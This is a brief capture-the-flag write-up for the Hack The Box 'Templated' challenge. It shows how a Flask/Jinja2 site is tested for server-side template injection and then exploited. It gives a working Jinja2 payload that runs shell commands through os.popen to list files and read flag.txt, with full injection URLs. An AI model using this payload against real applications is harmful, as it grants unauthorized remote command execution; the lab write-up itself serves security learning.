# Hack The box : Templated

The landing page of the challange is showing "Site still under construction." and below that line i saw "Proudly powered by Flask/Jinja2"

![image](https://user-images.githubusercontent.com/55247170/155877537-4b285c3f-c9f6-4bea-a2b1-03f83950b447.png)


I tried template injection vulnerbility .

[SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python)

Check if this web app is vulnerable to template injection by adding "{{7*7}}" in the url .

http://167.99.85.251:32285/{{7*7}}

And i saw "49" so it worked.

![image](https://user-images.githubusercontent.com/55247170/155877545-31df6453-0f63-4296-9599-b8d37de336bb.png)


Then i tired the Subprocess.Popen payload to list the files.

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

http://167.99.85.251:32285/%7B%7Bconfig.__class__.__init__.__globals__['os'].popen('ls').read()%7D%7D

![image](https://user-images.githubusercontent.com/55247170/155877555-21e51a82-2c30-456c-b00c-1dfa9fa63cd7.png)


There is a flag.txt file. Reading the flag with cat command.

http://167.99.85.251:32285/%7B%7Bconfig.__class__.__init__.__globals__['os'].popen('cat%20flag.txt').read()%7D%7D

![image](https://user-images.githubusercontent.com/55247170/155877559-44867974-6175-4c3a-a606-72a061f57ffc.png)


Submit the Flag , Done.
